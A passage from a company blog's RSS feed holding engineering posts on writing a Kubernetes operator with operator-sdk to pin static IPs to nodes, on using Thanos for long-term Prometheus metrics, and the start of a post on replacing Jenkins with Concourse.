So we decided against this approach.</p><h3 class="anchor anchorWithStickyNavbar_LWe7" id="creating-an-operator">Creating an operator<a class="hash-link" href="#creating-an-operator" title="Direct link to heading">​</a></h3><p>An Operator/Controller on the other hand is a component observing resources and then try to create the declared resources.
The difference between a controller and an operator is basically that an operator is handling the lifecycle of an
application, whereas a controller may control specific resources that are not associated with a specific application.
They both use the controller pattern though and both can be implemented with the same toolset, so for simplicity sake in the
context of this article, we will consider them to be equal.</p><p>Operators usually consists at least out of a <strong><a href="https://kubernetes.io/docs/concepts/extend-kubernetes/api-extension/custom-resources/" target="_blank" rel="noopener noreferrer">CRD(CustomResourceDefinition)</a></strong>, an <strong>event listener</strong> and a <strong>reconciliation loop</strong>.
The <em>CRD</em> basically creates a new type of resource and effectively implements a domain specific language for the operator. The whole description on what this deployment
needs to look like and all its abilities need to be defined in the <em>CRD</em>. The operator will create an <em>event listener</em> for that
<em>CRD</em> as the primary resource and additional <em>event listeners</em> for the secondary resource (most likely pods in this example).
The <em>event listener</em> will let the <em>reconciliation loop</em> know once a <a href="https://en.wikipedia.org/wiki/Create,_read,_update_and_delete" target="_blank" rel="noopener noreferrer">CRUD</a> operation has been requested on either the primary or
secondary resource. The <em>loop</em> will then try to bring the <em>CRD</em> into the desired state, depending on what operation has been
requested. So in the Redis example it will either create the pods, update the pods, in the case of an upgrade it might blue/green
deploy the pods or delete the pods. Basically things a human operator would do in this case, just in programmatic form, taking it
from a declarative form into existing resources.</p><p>As our initial problem was making services available on static IP addresses, we chose to explore this approach further,
basically attaching additional IP addresses to the nodes running specific pods.</p><h2 class="anchor anchorWithStickyNavbar_LWe7" id="building-an-operatorcontroller">Building an Operator/Controller<a class="hash-link" href="#building-an-operatorcontroller" title="Direct link to heading">​</a></h2><p>For building an operator, there are several frameworks out there, but we will only look at the <a href="https://github.com/operator-framework/operator-sdk" target="_blank" rel="noopener noreferrer">operator-framework</a> in
this article.</p><h3 class="anchor anchorWithStickyNavbar_LWe7" id="operator-sdk">Operator-SDK<a class="hash-link" href="#operator-sdk" title="Direct link to heading">​</a></h3><p>The Operator framework is a project that is designed to help you get started on creating an operator. To achieve that,
it will generate quite a bit of boilerplate.</p><p>The Operator-SDK supports three different models of creating an operator:</p><ul><li>Helm</li><li>Ansible</li><li>Golang</li></ul><p>Depending on your choice of tool, you will be able to integrate deeper into Kubernetes or not.</p><p><img loading="lazy" alt="operator-sdk-capabilites" src="/jp/assets/images/operator-capability-level-f511b5d60b3e9160a4582577204888cd.png" title="Operator sdk capabilities (Taken from the operator-sdk repo)" width="2440" height="1200" class="img_ev3q">
<em><a href="https://github.com/operator-framework/operator-sdk/blob/master/README.md" target="_blank" rel="noopener noreferrer">Operator sdk capabilities</a></em></p><p>As we didn't want to be limited by our choice later on and wanted to expose metrics from our operator, we chose to
implement our operator in golang. We will be using the operator-sdk version 0.12 for this.</p><h3 class="anchor anchorWithStickyNavbar_LWe7" id="what-we-want-to-do">What we want to do<a class="hash-link" href="#what-we-want-to-do" title="Direct link to heading">​</a></h3><p>Looking at the problem again, we need some way to make sure that a node that runs a specific pod, needs to
have an IP address attached to it. This IP address will be given to connecting parties as a entry point to our
system and thus cannot change.</p><p>Features it needs to support</p><ul><li>Reserve IP address from range</li><li>Attach IP address to node running pod</li><li>Detach IP address from node that is not running pod</li><li>Move IP addresses around in case of node failure</li></ul><p>This feature list already shows some things we will not and most likely cannot support. For example autoscaling of
replica sets will not work as an IP address is bound to a node with an assigned pod. There is
a 1-1 association here. However it is still possible to use the self-healing properties of Deployments
in this case.</p><p>When thinking about modelling this behaviour, we basically decided on the following approach:</p><ul><li>Create a IP kind (for reserving the IP Address in the Range)</li><li>Use annotations to attach the IP Address to a pod</li></ul><p>We also thought about creating a StaticIPDeployment kind, but at the end decided against it, as
we feared that the lifecycle management would be way more complicated if we needed to manage a deployment
instead of just controlling the assignment of an IP Address.</p><p>After all this is the first Operator we are going to write and didn't want to drown in complexity from day one.
We would rather iterate and scrap everything after we tried it, then going too complex from the start.</p><h3 class="anchor anchorWithStickyNavbar_LWe7" id="implementation">Implementation<a class="hash-link" href="#implementation" title="Direct link to heading">​</a></h3><p>The first thing you do when starting off a new operator, is that you initialize the directory of your
operator with the following command:</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#bfc7d5;--prism-background-color:#292d3e"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#bfc7d5"><span class="token plain">operator-sdk new app-operator --repo &lt;YOURREPO&gt;</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>This will create some boilerplate folders and files for you and will look roughly like this:</p><p><img loading="lazy" alt="operator-fs-structure" src="/jp/assets/images/operator-structure-1a847ce462732788fdab91235ce1a528.png" title="Operator Folder Structure" width="351" height="169" class="img_ev3q"></p><p>The next thing you might want to do is then add the boilerplate for a CRD and a Controller:</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#bfc7d5;--prism-background-color:#292d3e"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#bfc7d5"><span class="token plain">operator-sdk add api --api-version=ip.wgtwo.com/v1alpha1 --kind=IP</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">operator-sdk add controller --api-version=ip.wgtwo.com/v1alpha1 --kind=IP</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>After creating the boilerplate, your folder structure will look a lot like this:</p><p><img loading="lazy" alt="operator-fs-structure-expanded" src="/jp/assets/images/operator-structure-expanded-5901aa50d6e40055e6140151f960b40f.png" title="Operator Folder Structure Expanded" width="335" height="536" class="img_ev3q"></p><p>The most important files right now are in:</p><ul><li>cmd/manager/main.go (the main program that will run in the cluster)</li><li>pkg/apis/ip/v1alpha1/ip_types.go (definition of the CRD)</li><li>pkg/controller/ip_controller.go (event listener and reconciliation loop)</li></ul><h4 class="anchor anchorWithStickyNavbar_LWe7" id="creating-the-crd">Creating the CRD<a class="hash-link" href="#creating-the-crd" title="Direct link to heading">​</a></h4><p>To start off, we define how our CRD should look like to be able to manage our IP Address. We do this,
by creating structs in go that have all the fields our CRD shall have. This includes metadata, "spec" and
"status" fields.</p><p>There is also a bit of operator-sdk specific code we need to add. This is so that the sdk can generate the
openapi spec and other auto-generated code.</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#bfc7d5;--prism-background-color:#292d3e"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#bfc7d5"><span class="token plain">// +k8s:openapi-gen=true</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">// +kubebuilder:subresource:status</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">// +kubebuilder:resource:path=ips,scope=Cluster</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">type IP struct {</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">    metav1.TypeMeta   `json:",inline"`</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">    metav1.ObjectMeta `json:"metadata,omitempty"`</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">    Spec   IPSpec   `json:"spec,omitempty"`</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">    Status IPStatus `json:"status,omitempty"`</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">}</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>The "spec" needs to contain all information the controller needs to create the resource.
The "status" part needs to contain all the bookkeeping information the controller needs to work. In a way the
"status" fields are used as a database for operating Kubernetes (yes, this is oversimplified).</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#bfc7d5;--prism-background-color:#292d3e"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#bfc7d5"><span class="token plain">// +k8s:openapi-gen=true</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">type IPSpec struct {</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">    Address string `json:"address"`</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">    Reassign bool `json:"reassign,omitempty"`</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">}</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">// IPStatus defines the observed state of IP</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">// +k8s:openapi-gen=true</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">type IPStatus struct {</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">    Assigned bool   `json:"assigned"`</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">    Claimed  bool   `json:"claimed"`</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">    Node     string `json:"node,omitempty"`</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">    Pod      string `json:"pod,omitempty"`</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">    Original IPSpec `json:"original,omitempty"`</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">}</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>As you can see our new IP Resource type, as defined by the CRD that we are gonna create from these structs, is
going to have two fields: "Address" and "Reassign".
The corresponding "status" part of the resource, has a lot more fields, which we are using for bookkeeping.</p><p>After we have created those structs and know how the CRD needs to look like, we actually auto-generate the CRD yaml:</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#bfc7d5;--prism-background-color:#292d3e"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#bfc7d5"><span class="token plain">operator-sdk generate k8s</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">operator-sdk generate openapi</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>NB: This changed since operator-sdk 0.15</p><h4 class="anchor anchorWithStickyNavbar_LWe7" id="creating-the-controller">Creating the controller<a class="hash-link" href="#creating-the-controller" title="Direct link to heading">​</a></h4><p>There are two main parts to the controller. One part that creates a watcher on resources and one part
that reconciles your resource (in our case the IP and Pods).</p><h5 class="anchor anchorWithStickyNavbar_LWe7" id="watching-for-resource-changes">Watching for resource changes<a class="hash-link" href="#watching-for-resource-changes" title="Direct link to heading">​</a></h5><p>The watch code is in our case in the <code>add</code> function of ip_controller.go:</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#bfc7d5;--prism-background-color:#292d3e"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#bfc7d5"><span class="token plain">    // Watch for changes to primary resource IP, as this always requires an action</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">    err = c.Watch(&amp;source.Kind{Type: &amp;ipv1alpha1.IP{}}, &amp;handler.EnqueueRequestForObject{})</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">    if err != nil {</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">        return err</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">    }</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">    // Create Filter list triggering on ip.wgtwo.com/ip as annotation</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">    pred := predicate.Funcs{</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">        // Ignore the pod if it does not contain annotation ip.wgtwo.com/ip</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">        CreateFunc: func(e event.CreateEvent) bool {</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">            return hasAnnotation(e.Meta)</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">        },</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">        UpdateFunc: func(e event.UpdateEvent) bool {</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">            if hasAnnotation(e.MetaOld) || hasAnnotation(e.MetaNew){</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">                return true</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">            } else {</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">                return false</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">            }</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">        },</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">        DeleteFunc: func(e event.DeleteEvent) bool {</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">            // Evaluates to false if the object has been confirmed deleted.</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">            return !e.DeleteStateUnknown</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">        },</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">    }</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">    // Watch for all pods having the right annotation</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">    err = c.Watch(&amp;source.Kind{Type: &amp;corev1.Pod{}}, &amp;handler.EnqueueRequestForObject{}, pred)</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>Here we are creating watchers for all changes to the <code>IP</code> resource and watchers for all create/update/delete operations on
pods, if they have a specific annotation set.</p><p>If any of these conditions are met, the reconciliation loop will be triggered.</p><h5 class="anchor anchorWithStickyNavbar_LWe7" id="reconciliation">Reconciliation<a class="hash-link" href="#reconciliation" title="Direct link to heading">​</a></h5><p>This is where the business logic of your operator/controller is sitting. The <code>Reconcile</code> function in <code>ip_controller.go</code> will
be triggered whenever one of the watch conditions fits.
We do not know which type of resource triggered the loop, so that is the first thing we need to figure out:</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#bfc7d5;--prism-background-color:#292d3e"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#bfc7d5"><span class="token plain">oip := &amp;ipv1alpha1.IP{}</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">err := r.client.Get(context.TODO(), request.NamespacedName, oip)</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">if err == nil {</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">    ... yes it is a resource of kind IP ... go and do business</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">}</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">...</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">op := &amp;corev1.Pod{}</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">err = r.client.Get(context.TODO(), request.NamespacedName, op)</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">if err == nil {</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">    ... yes it is a resource of kind Pod ... go and do business</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">}</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">...</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>In these two code blocks, we are handling all the interactions for the primary resource of kind IP and the secondary
resource of type pod. Depending on what has happened last we have different scenarios.</p><p>Cases for the IP resource to consider:</p><ul><li>IP is new</li><li>IP has been modified</li><li>IP has been deleted</li></ul><p>Cases for the Pod resource to consider:</p><ul><li>Annotation sticking the IP to the pod has been deleted</li><li>IP needs to be assigned to a pod</li><li>Pod has moved to another node</li><li>Pod has been deleted</li></ul><p>We will not go any further into the detail on what these parts are actually doing, as this is enough
to actually give you an idea on how this can be accomplished.</p><h2 class="anchor anchorWithStickyNavbar_LWe7" id="summary">Summary<a class="hash-link" href="#summary" title="Direct link to heading">​</a></h2><p>We have been looking at how to expand Kubernetes to suit our needs better. Creating the Operator/Controller
has taught us quite a bit about how Kubernetes works and has already saved us work in the past
few months, especially on node failures.</p><p>The operator-sdk has been a great tool for us to solve this problem and we see that there is a lot of work
going into it, making it simpler to create operators. It might look intimidating at first, but is worth the effort and
we think in the future Kubernetes operators will be the way how stateful components will be managed.</p><h2 class="anchor anchorWithStickyNavbar_LWe7" id="resources--further-reading">Resources / Further Reading<a class="hash-link" href="#resources--further-reading" title="Direct link to heading">​</a></h2><ul><li>Programming Kubernetes by Stefan Schimanski and Michael Hausenblas</li><li><a href="https://developer.ibm.com/articles/creating-a-custom-kube-scheduler/" target="_blank" rel="noopener noreferrer">Creating a custom kube-scheduler</a></li><li><a href="https://github.com/operator-framework/operator-sdk" target="_blank" rel="noopener noreferrer">Operator SDK</a></li></ul>]]></content:encoded>
            <category>infrastructure</category>
            <category>kubernetes</category>
            <category>networking</category>
            <category>AWS</category>
        </item>
        <item>
            <title><![CDATA[Towards observability nirvana: infinite metric retention with Thanos]]></title>
            <link>https://www.wgtwo.com/jp/blog/metrics-unlimited-thanos</link>
            <guid>metrics-unlimited-thanos</guid>
            <pubDate>Tue, 28 Jan 2020 00:00:00 GMT</pubDate>
            <description><![CDATA[In the current DevOps world, our industry relies on the ability to observe and monitorize our infrastructure and]]></description>
            <content:encoded><![CDATA[<p>In the current DevOps world, our industry relies on the ability to observe and monitorize our infrastructure and
services. <strong>wgtwo</strong> is no exception here and as we are operating in the TelCo space
we wanted to know more about the usage patterns of our platform over days, months and even years.</p><p>Internally we have been running Prometheus for a long time with a fairly limited retention of 30 days. This did not
allow us to look far enough back in time to make the observations we wanted to.
Luckily for us there already was a solution out there that would fill our needs and in addition to that make our
monitoring stack more resilient. The solution is called <a href="https://thanos.io/" target="_blank" rel="noopener noreferrer">Thanos</a>.</p><h2 class="anchor anchorWithStickyNavbar_LWe7" id="thanos">Thanos<a class="hash-link" href="#thanos" title="Direct link to heading">​</a></h2><p>Thanos was originally developed by a company called <a href="https://improbable.io/" target="_blank" rel="noopener noreferrer">Improbable</a> to provide long term storage
for Prometheus. It evolved into a much more complicated component which wildly improved the scalability of the
Prometheus monitoring Stack.</p><p>The basic functionality however is that Thanos will upload the metrics collected by Prometheus onto any service with a
S3-compatible API or any other storage target supported by the Prometheus remote write feature. For readability we
will only refer to it as S3 Storage as this is our storage target.</p><p>We shall briefly look at all those components before describing how we are leveraging Thanos to obtain a higher metric
retention and higher reliability.</p><h3 class="anchor anchorWithStickyNavbar_LWe7" id="thanos-sidecar">Thanos Sidecar<a class="hash-link" href="#thanos-sidecar" title="Direct link to heading">​</a></h3><p>The Sidecar runs as the name suggests in the same pod as Prometheus and observes when Prometheus saves new storage
buckets on disk, which it does about every 2 hours. If configured to do so, it will upload those storage bucket into S3.
Another important feature is that it extends the Prometheus Pod with an API that can be used by Thanos Querier
as a Store API endpoint to query Prometheus metrics.</p><h3 class="anchor anchorWithStickyNavbar_LWe7" id="thanos-store">Thanos Store<a class="hash-link" href="#thanos-store" title="Direct link to heading">​</a></h3><p>Thanos Store implements the Thanos Store API and makes the metric data stored in the S3 bucket available to the
Thanos Querier. To do that it observes the configured S3 Bucket and reads the metadata of the stored storage buckets
available in S3.</p><h3 class="anchor anchorWithStickyNavbar_LWe7" id="thanos-querier">Thanos Querier<a class="hash-link" href="#thanos-querier" title="Direct link to heading">​</a></h3><p>Querier implements the Prometheus Query API and understands PromQL. It then sends the query using the aforementioned
Store API to all known Thanos Stores (discovered using service discovery) and awaits the metric information from the
stores, be it directly from Prometheus via the sidecar or metrics stored in S3 Object storage via Thanos Store.</p><h3 class="anchor anchorWithStickyNavbar_LWe7" id="thanos-compactor">Thanos Compactor<a class="hash-link" href="#thanos-compactor" title="Direct link to heading">​</a></h3><p>It does not make a lot of sense to keep old metrics that are scraped every 15 or 30 seconds forever. At some point these
metrics would no longer be useful to make sense of your metrics. This is where
the Thanos Compactor comes in. It creates aggregates of old metrics based on rules. It will for example
aggregate metrics that are older than 30 days into 5 minute chunks. This saves resources and still gives you
almost the same accuracy when looking at longer timespans. After those metrics have been aggregated, they are
written back into the S3 bucket and the metadata gets updated.</p><h3 class="anchor anchorWithStickyNavbar_LWe7" id="thanos-ruler">Thanos Ruler<a class="hash-link" href="#thanos-ruler" title="Direct link to heading">​</a></h3><p>The Ruler component is the Thanos equivalent of Recording Rules. It can look at all Store APIs and generate new metrics
according to the Recording Rules fed into the Ruler component. However since this rule processing is not done against a
local datastore, it is possible that these new metric datapoints will not always be generated as it relies on a reliable
data source to do this in the required intervals.</p><h2 class="anchor anchorWithStickyNavbar_LWe7" id="architecture-in-a-cluster">Architecture in a Cluster<a class="hash-link" href="#architecture-in-a-cluster" title="Direct link to heading">​</a></h2><p><img loading="lazy" alt="Thanos Architecture" src="/jp/assets/images/thanos_architecture-45a1d9e2b04a1eea265ebeebfde7206f.png" width="701" height="471" class="img_ev3q"></p><p>As we can see, there are quite a few things going on in this architectural view of the system, but on the other hand it
is fairly simple to understand as the components are nicely decoupled from each other.</p><p>An interesting thing here is that the drawing has multiple Prometheus instances with multiple sidecars. Thanos actually
allows for deduplication of timeseries data. The data uploaded from the sidecars contains information about which prometheus
instance the metrics are generated from, and adds that. The Querier can then deduplicate this data so that the metrics shown
in Grafana are consistent and do not come sometimes from Prometheus A and sometimes from Prometheus B.</p><p>This design also allows for an interesting other Use Case: querying multiple clusters. As
long as the storage location used by the sidecars for uploading the metrics is identical, the time series data is
available to the Thanos Store and therefor the Querier and Grafana.
That even allows to run Grafana, Querier and Store in a completely different part of the world if need be.</p><h2 class="anchor anchorWithStickyNavbar_LWe7" id="is-it-worth-it">Is it worth it?<a class="hash-link" href="#is-it-worth-it" title="Direct link to heading">​</a></h2><h3 class="anchor anchorWithStickyNavbar_LWe7" id="pros">Pros<a class="hash-link" href="#pros" title="Direct link to heading">​</a></h3><ul><li>highly available Prometheus</li><li>increased reliability (decoupled query component)</li><li>infinite metric storage</li><li>query multiple clusters from a single point</li><li>easy to scale</li></ul><h3 class="anchor anchorWithStickyNavbar_LWe7" id="cons">Cons<a class="hash-link" href="#cons" title="Direct link to heading">​</a></h3><ul><li>more complex architecture</li><li>increased resource usage</li></ul><h2 class="anchor anchorWithStickyNavbar_LWe7" id="what-are-the-biggest-benefits-for-us">What are the biggest benefits for us?<a class="hash-link" href="#what-are-the-biggest-benefits-for-us" title="Direct link to heading">​</a></h2><p>As stated in the beginning of this article one of our objectives for implementing Thanos was the increased
metric retention to be able to look back further in time.</p><p>The most interesting features for us are to be able to:</p><ul><li>analyze trends and identify anomalies within the mobile core network</li><li>visualize and graph service usage</li><li>predict service usage on peak days (think New Years Eve)</li><li>observe behaviour over multiple deployments (regions, customers and cloud providers)</li></ul><h2 class="anchor anchorWithStickyNavbar_LWe7" id="summary">Summary<a class="hash-link" href="#summary" title="Direct link to heading">​</a></h2><p>Even though Thanos comes with an increased architectural and operational complexity, we have to say after running it for a while, we think it is totally worth it. We can make architecture decisions by looking further
back in time than before. It also has the additional advantage that a misconfiguration of a Prometheus deployment
does not pull down the whole stack as Prometheus is HA and only updates one at a time. If the deployment fails,
we can get notified and the deployment can be aborted. Also upgrades of the whole monitoring stack, can
now be done gradually, which is also a great advantage for us!</p>]]></content:encoded>
            <category>infrastructure</category>
            <category>observability</category>
            <category>prometheus</category>
            <category>thanos</category>
            <category>kubernetes</category>
        </item>
        <item>
            <title><![CDATA[We killed the butler: Replacing Jenkins with Concourse]]></title>
            <link>https://www.wgtwo.com/jp/blog/replacing-jenkins-with-concourse</link>
            <guid>replacing-jenkins-with-concourse</guid>
            <pubDate>Fri, 20 Dec 2019 00:00:00 GMT</pubDate>
            <description><![CDATA[At wgtwo, we try to use CI/CD pipelines to automate all of our repetitive tasks when it comes to code and infrastructure deployment and testing, such as:]]></description>
            <content:encoded><![CDATA[<p>At <strong>wgtwo</strong>, we try to use CI/CD pipelines to automate all of our repetitive tasks when it comes to code and infrastructure deployment and testing, such as:</p><ul><li>running unit tests on each pull request</li><li>building and running integration tests with bazel on every merge to the monorepo</li><li>building container images and upload them to the registry</li><li>scanning all images for security flaws</li><li>running acceptance tests in the staging environment</li><li>syncing secrets between different sources</li><li>notifying slack if changes are made in Kubernetes</li></ul><p>We had been using <a href="https://jenkins.io/" target="_blank" rel="noopener noreferrer">Jenkins</a> to run such pipelines, but having to configure it by navigating a web GUI made it difficult to maintain, redeploy, and upgrade, so we decided to look for alternatives.</p><p><img loading="lazy" alt="Jenkins" src="/jp/assets/images/jenkins-f2293a0585d8d609061bd297e685a661.png" width="1050" height="344" class="img_ev3q"></p><p>The majority of our code lives in a monorepo, and we use Bazel to manage builds and tests.
